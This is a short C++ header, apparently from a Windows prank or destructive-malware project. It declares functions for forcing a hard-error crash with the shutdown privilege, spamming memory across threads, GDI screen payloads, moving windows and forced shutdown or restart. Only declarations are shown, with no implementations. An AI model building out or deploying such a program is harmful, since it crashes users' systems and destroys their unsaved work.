#pragma once

#define SE_SHUTDOWN_PRIVILEGE 19 
#define INVOKE_HARD_ERROR_FAILED 1
#define MAIN_EXIT_SUCCESS 0
#define no_args void

#include <iostream>
#include <windows.h>
#include <winternl.h>
#include <string>
#include <math.h>
#include <strmif.h>
#include <list>
#include <dshow.h>
#include <WinReg.h>
#include <thread>
#include "Dependencies/Toast/wintoastlib.h"

#pragma comment(lib,"Advapi32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "strmiids")

extern DWORD invokeHardError
(no_args);
extern VOID tMemSpamSub
(no_args);
extern VOID tMemSpam
(int nThreads);
extern INT makeToastNotif
(LPWSTR Head, LPWSTR Body);
extern VOID Boom
(no_args);
extern INT MRandom
(no_args);
extern VOID movingWindows
(unsigned int nCount);
extern VOID startGDIPayload
(no_args);
extern VOID __fastcall Init
(no_args);

BOOL MuShutDown
(no_args);

BOOL MuRestart
(no_args);

#include "Bin.h"